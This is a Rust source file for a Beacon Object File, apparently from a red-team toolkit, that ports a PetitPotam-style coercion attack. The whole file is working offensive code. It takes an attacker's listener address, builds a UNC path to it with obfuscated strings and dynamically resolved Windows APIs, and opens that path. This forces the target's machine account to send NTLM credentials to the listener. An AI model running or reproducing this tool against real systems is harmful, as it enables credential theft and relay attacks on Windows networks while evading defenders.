// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
//
//! PetitPotam — force machine NTLM authentication to attacker listener.
//!
//! From the target machine, opens a UNC path pointing at the attacker's
//! listener (\\<listener>\<share>\coerce), which causes the target's computer
//! account to authenticate to the listener via NTLM.
//!
//! This is a simplified coercion equivalent: no raw EFSRPC RPC marshalling,
//! just the SMB-level forced authentication triggered by a CreateFile UNC path
//! (the same primitive PetitPotam exploits at a higher level).
//!
//! Args: <listener_ip_or_host> [share_name=share]
//!
//! MITRE ATT&CK: T1187 (Forced Authentication)
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique {
        id: "T1187",
        name: "Forced Authentication",
        tactic: "Credential Access",
    },
];

const GENERIC_READ: u32         = 0x8000_0000;
const FILE_SHARE_READ: u32      = 1;
const OPEN_EXISTING: u32        = 3;
const INVALID_HANDLE_VALUE: isize = -1isize;

dfr_fn!(
    create_file_a(
        lp_file_name: *const i8,
        dw_desired_access: u32,
        dw_share_mode: u32,
        lp_security_attributes: *mut u8,
        dw_creation_disposition: u32,
        dw_flags_and_attributes: u32,
        h_template_file: isize,
    ) -> isize,
    module = "kernel32.dll",
    api    = "CreateFileA"
);

dfr_fn!(
    close_handle(h_object: isize) -> i32,
    module = "kernel32.dll",
    api    = "CloseHandle"
);

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let listener  = String::from(parser.get_str());
    let share_arg = String::from(parser.get_str());

    if listener.is_empty() {
        return Err("usage: petit-potam <listener_ip> [share_name]");
    }
    if listener.len() > 128 { return Err("listener too long"); }

    let share = if share_arg.is_empty() { "share" } else { share_arg.as_str() };

    // Build UNC path: \\<listener>\<share>\coerce
    // Max: 2 + 128 + 1 + 64 + 1 + 6 + 1 = ~203 bytes
    let mut unc_buf = [0i8; 256];
    let mut pos = 0usize;

    fn push(buf: &mut [i8], pos: &mut usize, s: &str) {
        for b in s.bytes() { if *pos + 1 < buf.len() { buf[*pos] = b as i8; *pos += 1; } }
    }

    obf! { let unc_prefix = "\\\\"; }
    push(&mut unc_buf, &mut pos, unc_prefix);
    push(&mut unc_buf, &mut pos, listener.as_str());
    push(&mut unc_buf, &mut pos, "\\");
    push(&mut unc_buf, &mut pos, share);
    obf! { let coerce_path = "\\coerce"; }
    push(&mut unc_buf, &mut pos, coerce_path);

    println!("[*] coercing auth to: {}{}{}{}{}", unc_prefix, listener, "\\", share, coerce_path);

    // Attempt to open the UNC path — this triggers SMB auth from target to listener
    let hfile = unsafe {
        create_file_a(
            unc_buf.as_ptr(),
            GENERIC_READ,
            FILE_SHARE_READ,
            core::ptr::null_mut(),
            OPEN_EXISTING,
            0,
            0,
        )
    }.map_err(|_| "resolve failed")?;

    // The file open is expected to fail (listener likely isn't serving files),
    // but the NTLM challenge/response exchange has already occurred.
    if hfile != INVALID_HANDLE_VALUE && hfile != 0 {
        let _ = unsafe { close_handle(hfile) };
    }

    println!("[+] coercion attempt sent — check listener for NTLM authentication");
    Ok(())
}
